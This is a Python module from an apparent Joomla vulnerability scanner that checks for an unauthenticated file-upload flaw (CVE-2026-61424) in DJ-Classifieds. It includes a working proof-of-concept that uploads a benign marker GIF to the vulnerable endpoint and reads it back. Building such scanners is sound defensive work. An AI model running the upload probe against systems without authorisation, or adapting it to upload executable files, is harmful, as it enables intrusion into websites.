from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_component_finding

CVE_ID = "CVE-2026-61424"
NAME = "DJ-Classifieds unauthenticated arbitrary file upload"
COMPONENT = "DJ-Classifieds"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "DJ-Classifieds before 3.11.2"
FIXED_RULE = "Update DJ-Classifieds to 3.11.2 or newer"
DETECTOR_KEY = "djclassifieds"
UPLOAD_ENDPOINT = "/index.php?option=com_djclassifieds&task=imageupload&tmpl=component"
UPLOAD_DIR = "/tmp/djupload"
# Minimal valid 1x1 GIF: 3.11.1 runs getimagesize() on image extensions, so the
# probe body must decode as a real image; the marker rides after the trailer.
GIF_1X1 = bytes.fromhex(
    "47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b"
)


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required("3.11.2") else "PATCHED"


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    plugins: dict[str, Any] | None = None,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
):
    finding = passive_component_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        detector_key=DETECTOR_KEY,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade DJ-Classifieds to 3.11.2 or newer and inspect its upload directories for executable files.",
    )
    finding.exploit_available = HAS_EXPLOIT
    if not run_exploit_check:
        return finding
    if exploit_mode != "safe":
        finding.detail += " This CVE module only supports the safe image-upload proof."
        return finding
    if finding.status in {"NOT_AFFECTED", "NOT_DETECTED"}:
        return finding
    probe = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = finding.component_version
    return probe


def _sanitized_name(name: str) -> str:
    # Mirrors DJClasssifiedsUpload::upload(): preg_replace('/[^\w\._]+/', '_', $name)
    return re.sub(r"[^\w._]+", "_", name)


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    marker = f"PROOFCMS_DJCF_{rand_str(12)}"
    sent_name = f"proofcms_{secrets.token_hex(6)}.gif"
    stored_name = _sanitized_name(sent_name)
    payload = GIF_1X1 + b"\n" + marker.encode() + b"\n"
    proof_url = f"{base}{UPLOAD_ENDPOINT}"
    evidence: dict[str, object] = {
        "handler_reached": False,
        "upload_accepted": False,
        "marker_read_back": False,
        "stored_name": stored_name,
        "upload_path": f"{UPLOAD_DIR}/{stored_name}",
    }
    upload = client.post(
        proof_url,
        fields={"name": sent_name, "filename": sent_name},
        files={"file": (sent_name, payload, "image/gif")},
        timeout=timeout,
    )
    if is_transport_error(upload):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            detail=f"The imageupload request failed at the transport layer ({transport_error_detail(upload)}).",
            action="Retry when the target is reachable.",
        )
    upload_body = upload.get("body", "") or ""
    evidence["handler_reached"] = True
    accepted = '"result" : null' in upload_body and '"error"' not in upload_body
    evidence["upload_accepted"] = accepted
    if not accepted:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            detail=(
                "The imageupload endpoint did not accept the benign GIF probe "
                f"(HTTP {upload.get('status', 0)}; no jsonrpc result). "
                "The upload gate may already enforce authentication or an image allow-list."
            ),
            action="If DJ-Classifieds is below 3.11.2, verify the imageupload task manually.",
        )
    readback = client.get(f"{base}{UPLOAD_DIR}/{stored_name}", timeout=timeout)
    body = readback.get("body", "") or ""
    if isinstance(body, bytes):
        body_bytes = body
    else:
        body_bytes = body.encode("utf-8", errors="replace")
    if readback.get("status") == 200 and marker.encode() in body_bytes:
        evidence["marker_read_back"] = True
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_DIR}/{stored_name}",
            evidence=evidence,
            detail=(
                "Unauthenticated upload accepted a benign marker GIF and the file was read back "
                "byte-identical from the public upload directory, confirming the missing "
                "authentication/CSRF gate. Execution is server-dependent (served as image/gif "
                "here); no executable content was uploaded."
            ),
            action=f"Upgrade DJ-Classifieds to 3.11.2 or newer and delete {stored_name} from the upload directory.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        evidence=evidence,
        detail=(
            "The upload reported success but the file could not be read back from the public "
            f"upload directory (HTTP {readback.get('status', 0)})."
        ),
        action="Verify the configured upload path and web access manually.",
    )


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-10",
        "updated": "2026-11-10",
        "required_detectors": [DETECTOR_KEY],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-61424",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-61424",
            "https://dj-extensions.com/blog/general/dj-classifieds-3-11-2-security-release",
            "https://mysites.guru/blog/dj-classifieds-unauthenticated-file-upload/",
        ],
    }
